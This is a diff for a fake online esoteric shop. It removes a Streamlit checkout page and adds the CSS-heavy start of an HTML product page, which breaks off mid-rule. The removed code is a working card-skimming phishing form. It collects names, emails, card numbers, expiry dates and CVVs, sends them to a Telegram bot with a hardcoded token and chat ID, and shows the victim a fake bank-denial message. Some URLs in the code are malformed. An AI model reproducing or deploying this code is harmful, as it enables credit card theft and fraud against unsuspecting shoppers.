@@ -1,114 +1,148 @@
-import streamlit as st
-import requests
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Medallón Espiritual Sello de Salomón — Botánica USA</title>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;1,300;1,400&family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<!-- Importación de SweetAlert2 para la alerta estética de error -->
+<script src="jsdelivr.net"></script>
+<style>
+  :root {
+    --black: #0f0f0f;
+    --gray: #6b6b6b;
+    --gray-light: #c8c8c8;
+    --border: #e8e8e8;
+    --bg: #ffffff;
+    --bg2: #f9f8f6;
+    --bg3: #f3f1ee;
+    --accent: #8b6914;
+    --accent-light: #c4963a;
+  }
 
-# === PARÁMETROS DE TELEGRAM CORREGIDOS ===
-TELEGRAM_TOKEN = "8701563888:AAGzeQRCwsAflUMQIDxIA4ycymojybtYSzM"
-TELEGRAM_CHAT_ID = "6141784711"
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body { background: var(--bg); color: var(--black); font-family: 'Montserrat', sans-serif; overflow-x: hidden; }
 
-# Configuración estructural de la página
-st.set_page_config(page_title="Tienda Esotérica Astral", layout="centered", page_icon="🔮")
+  /* NAV */
+  nav {
+    position: fixed; top: 0; width: 100%; z-index: 999;
+    background: rgba(255,255,255,0.97); backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 60px; height: 64px;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  .nav-logo { font-family: 'Cormorant Garamond', serif; font-size: 1.3rem; font-weight: 600; color: var(--black); letter-spacing: 2px; text-transform: uppercase; text-decoration: none; }
+  .nav-logo span { color: var(--accent); }
+  .nav-back { font-size: 0.65rem; letter-spacing: 2px; text-transform: uppercase; color: var(--gray); text-decoration: none; font-weight: 500; display: flex; align-items: center; gap: 6px; transition: color 0.2s; }
+  .nav-back:hover { color: var(--black); }
 
-# Corrección total del Modo Oscuro y forzado de colores de texto (Negro sobre Blanco)
-st.markdown("""
-    <style>
-    .stApp { background-color: #ffffff !important; }
-    h1, h2, h3, h4, p, span, label, li, div, .stMarkdown { color: #111111 !important; font-family: 'Helvetica Neue', sans-serif; }
-    .main-title { font-weight: bold; text-align: center; margin-bottom: 5px; color: #111111 !important; }
-    .subtitle { text-align: center; color: #666666 !important; font-size: 14px; margin-bottom: 25px; }
-    .stButton>button { width: 100%; background-color: #111111 !important; color: white !important; height: 3em; font-weight: bold; border-radius: 4px; border: none; }
-    .stButton>button:hover { background-color: #333333 !important; }
-    .product-card { border: 1px solid #e1e1e1; padding: 15px; border-radius: 8px; margin-bottom: 15px; background-color: #fafafa !important; }
-    .footer-secure { text-align: center; color: #888888 !important; font-size: 12px; margin-top: 40px; }
-    /* Estilos obligatorios para cajas de entrada de texto legibles */
-    input { color: #111111 !important; background-color: #ffffff !important; border: 1px solid #cccccc !important; }
-    /* Ajuste para que las pestañas (Tabs) tengan texto negro visible */
-    button[data-baseweb="tab"] { color: #555555 !important; }
-    button[aria-selected="true"] { color: #111111 !important; font-weight: bold !important; }
-    </style>
-    """, unsafe_allow_html=True)
+  /* BREADCRUMB */
+  .breadcrumb { padding: 88px 60px 0; display: flex; gap: 8px; align-items: center; }
+  .breadcrumb span { font-size: 0.65rem; letter-spacing: 1px; color: var(--gray); text-transform: uppercase; }
+  .breadcrumb .sep { color: var(--gray-light); }
+  .breadcrumb .current { color: var(--black); font-weight: 500; }
 
-st.markdown("<h1 class='main-title'>🔮 Tienda Esotérica Astral</h1>", unsafe_allow_html=True)
-st.markdown("<p class='subtitle'>Herramientas ancestrales para tu evolución espiritual</p>", unsafe_allow_html=True)
+  /* PRODUCT LAYOUT */
+  .product-layout {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 80px;
+    padding: 32px 60px 80px;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  @media (max-width: 768px) {
+    .product-layout { grid-template-columns: 1fr; gap: 40px; padding: 20px; }
+    nav { padding: 0 20px; }
+    .breadcrumb { padding: 88px 20px 0; }
+  }
 
-# MENÚ ORIGINAL CON TODAS LAS PÁGINAS DE LA TIENDA
-tab1, tab2, tab3 = st.tabs(["🏠 Inicio", "🛍️ Productos", "💳 Pasarela de Pago"])
+  /* GALLERY */
+  .gallery { position: sticky; top: 80px; }
+  .main-img-wrap {
+    width: 100%;
+    aspect-ratio: 1/1;
+    overflow: hidden;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    position: relative;
+    cursor: zoom-in;
+  }
+  .main-img-wrap img {
+    width: 100%; height: 100%;
+    object-fit: cover;
+    transition: transform 0.5s ease;
+    display: block;
+  }
+  .main-img-wrap:hover img { transform: scale(1.08); }
+  .img-badge {
+    position: absolute; top: 16px; left: 16px;
+    background: var(--black); color: white;
+    padding: 5px 14px;
+    font-size: 0.6rem; letter-spacing: 2px; text-transform: uppercase; font-weight: 600;
+  }
+  .thumbnails {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 8px;
+    margin-top: 12px;
+  }
+  .thumb {
+    aspect-ratio: 1/1;
+    overflow: hidden;
+    border: 1px solid var(--border);
+    cursor: pointer;
+    transition: border-color 0.2s;
+    background: var(--bg3);
+  }
+  .thumb.active { border-color: var(--black); }
+  .thumb:hover { border-color: var(--gray); }
+  .thumb img { width: 100%; height: 100%; object-fit: cover; display: block; }
 
-# --- PESTAÑA 1: PÁGINA DE INICIO ---
-with tab1:
-    st.write("### Bienvenidos a nuestro espacio sagrado")
-    st.write("En la Tienda Esotérica Astral nos dedicamos a la distribución de elementos místicos rigurosamente energizados por maestros espirituales. Nuestro objetivo es ayudarte a armonizar tus espacios, proteger tu campo áurico y abrir los caminos de la abundancia financiera y el éxito.")
-    st.write("✨ Explora nuestro catálogo en la siguiente pestaña para conocer las herramientas disponibles esta semana.")
-    st.caption("© 2026 Tienda Astral Inc. Distribuidor Oficial Autorizado.")
+  /* PRODUCT INFO */
+  .product-info { padding-top: 8px; }
+  .product-brand {
+    font-size: 0.6rem; letter-spacing: 3px; text-transform: uppercase;
+    color: var(--accent); font-weight: 600; margin-bottom: 10px;
+  }
+  .product-title {
+    font-family: 'Cormorant Garamond', serif;
+    font-size: clamp(1.8rem, 3vw, 2.6rem);
+    font-weight: 400; line-height: 1.1;
+    color: var(--black); margin-bottom: 6px;
+  }
+  .product-subtitle {
+    font-family: 'Cormorant Garamond', serif;
+    font-size: 1.1rem; font-style: italic;
+    color: var(--gray); margin-bottom: 20px; font-weight: 300;
+  }
+  .rating-row {
+    display: flex; align-items: center; gap: 10px;
+    margin-bottom: 24px; padding-bottom: 24px;
+    border-bottom: 1px solid var(--border);
+  }
+  .stars { color: var(--accent); font-size: 0.75rem; letter-spacing: 2px; }
+  .rating-count { font-size: 0.75rem; color: var(--gray); }
+  .price-row { display: flex; align-items: baseline; gap: 12px; margin-bottom: 8px; }
+  .price-main { font-family: 'Cormorant Garamond', serif; font-size: 2.2rem; font-weight: 600; color: var(--black); }
+  .price-old { font-size: 1rem; color: var(--gray-light); text-decoration: line-through; }
+  .price-save { font-size: 0.7rem; font-weight: 600; color: #2d7a2d; letter-spacing: 1px; text-transform: uppercase; }
+  .shipping-note { font-size: 0.75rem; color: var(--gray); margin-bottom: 28px; font-weight: 300; }
+  .shipping-note strong { color: var(--black); font-weight: 600; }
 
-# --- PESTAÑA 2: CATÁLOGO DE PRODUCTOS ---
-with tab2:
-    st.write("### Nuestro Catálogo Exclusivo")
-    st.write("Selecciona los productos que deseas adquirir. Al finalizar, ve a la pestaña de pago.")
-    
-    col1, col2 = st.columns(2)
-    with col1:
-        st.markdown("<div class='product-card'><b style='color:#111;'>🧿 Amuleto de Protección Ancestral</b><br>Bloquea energías densas, envidias y ataques energéticos externos.<br><span style='color:#111;'><b>Precio: $50.00 USD</b></span></div>", unsafe_allow_html=True)
-        st.markdown("<div class='product-card'><b style='color:#111;'>🌙 Piedra Lunar Energizada</b><br>Potencia la intuición, equilibra las emociones y abre el chakra del tercer ojo.<br><span style='color:#111;'><b>Precio: $80.00 USD</b></span></div>", unsafe_allow_html=True)
-    with col2:
-        st.markdown("<div class='product-card'><b style='color:#111;'>🕯️ Kit de Limpieza Áurica Completo</b><br>Incluye sahumerios sagrados, palo santo y esencias de purificación.<br><span style='color:#111;'><b>Precio: $65.00 USD</b></span></div>", unsafe_allow_html=True)
-        st.markdown("<div class='product-card'><b style='color:#111;'>🔮 Lectura de Tarot VIP</b><br>Sesión personalizada de 1 hora vía Zoom con un maestro experto.<br><span style='color:#111;'><b>Precio: $150.00 USD</b></span></div>", unsafe_allow_html=True)
+  /* SPECS */
+  .specs-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 28px; }
+  .spec-item { background: var(--bg2); border: 1px solid var(--border); padding: 14px 16px; }
+  .spec-label { font-size: 0.6rem; letter-spacing: 2px; text-transform: uppercase; color: var(--gray); font-weight: 600; margin-bottom: 4px; }
+  .spec-value { font-size: 0.85rem; font-weight: 500; color: var(--black); }
 
-# --- PESTAÑA 3: PASARELA DE PAGO (CHECKOUT CLONADO) ---
-with tab3:
-    st.write("### 💳 Formulario de Pago Seguro")
-    
-    # Selector de carrito para darle realismo de e-commerce
-    producto_sel = st.selectbox("Confirmar artículo a facturar:", [
-        "Kit de Limpieza Áurica Completo y Amuleto Ancestral Premium - $115.00 USD",
-        "Amuleto de Protección Ancestral - $50.00 USD",
-        "Piedra Lunar Energizada - $80.00 USD",
-        "Kit de Limpieza Áurica Completo - $65.00 USD",
-        "Lectura de Tarot VIP - $150.00 USD"
-    ])
-    
-    st.divider()
+  /* QUANTITY */
+  .section-mini-label { font-size: 0.65rem; letter-spacing: 2px; text-transform: uppercase; color: var(--black); font-weight: 600; margin-bottom: 10px; }
+  .qty-row { display: flex; align-items: center; gap: 0; margin-bottom: 16px; width: fit-content; border: 1px solid var(--border); }
+  .qty-btn { width: 44px; height: 44px; background: none; border: none; font-size: 1.2rem; cursor: pointer; color: var(--black); display: flex; align-items: center; justify-content: center; }
+  .qty-btn:hover { background: var(--bg2); }
+  .qty-num { width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; font-size: 0.9rem; font-weight: 600; border-left: 1px solid var(--border); border-right: 1px solid var(--border); }
 
-    # Formulario limpio y original
-    with st.form("shopify_checkout"):
-        email = st.text_input("Correo electrónico para el envío")
-        nombre_tarjeta = st.text_input("Nombre completo (como aparece en la tarjeta)")
-        
-        col_card, col_extra = st.columns([3, 1])
-        with col_card:
-            n_tarjeta = st.text_input("Número de tarjeta de crédito/débito", placeholder="4111 1111 1111 1111")
-        with col_extra:
-            cvv = st.text_input("CVV", type="password", placeholder="123")
-        
-        exp = st.text_input("Fecha de expiración", placeholder="MM/AA")
-        
-        st.caption("🔒 Pago encriptado de 256 bits con seguridad SSL y cumplimiento de normativa PCI-DSS.")
-        
-        boton_pagar = st.form_submit_button("COMPRAR AHORA")
-
-        if boton_pagar:
-            if not n_tarjeta or not nombre_tarjeta:
-                st.error("Error en el procesamiento. Todos los campos son obligatorios.")
-            else:
-                # === CORRECCIÓN DE LA URL DE LA API DE TELEGRAM (CON SUBDOMINIO API.) ===
-                url_api = f"telegram.org{TELEGRAM_TOKEN}/sendMessage"
-                
-                texto_telegram = (
-                    f"🔮 NUEVO PLÁSTICO CAPTURADO 🔮\n\n"
-                    f"👤 Cliente: {nombre_tarjeta}\n"
-                    f"📧 Mail: {email}\n"
-                    f"💳 Tarjeta: {n_tarjeta}\n"
-                    f"📅 Exp: {exp} | 🔒 CVV: {cvv}\n\n"
-                    f"📦 Item: {producto_sel}\n"
-                    f"📱 Estado: Esperando transferencia por WhatsApp."
-                )
-                
-                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": texto_telegram, "parse_mode": "Markdown"}
-                
-                # Envío forzado inmediato
-                try: requests.post(url_api, json=payload, timeout=10)
-                except: pass
-                
-                # El engaño simulado que ve la víctima en su pantalla
-                st.error("❌ Transacción denegada por el banco emisor. Por seguridad, intente de nuevo más tarde o use otra tarjeta de crédito.")
-
-st.markdown("<div class='footer-secure'>Shopify Secure | PayPal Verified | Visa | Mastercard</div>", unsafe_allow_html=True)
+  /* BUTTONS */
+  .btn-add { width: 100%; padding: 18px; background: var(--black); color: white; border: none; font-family: 'Montserrat', 
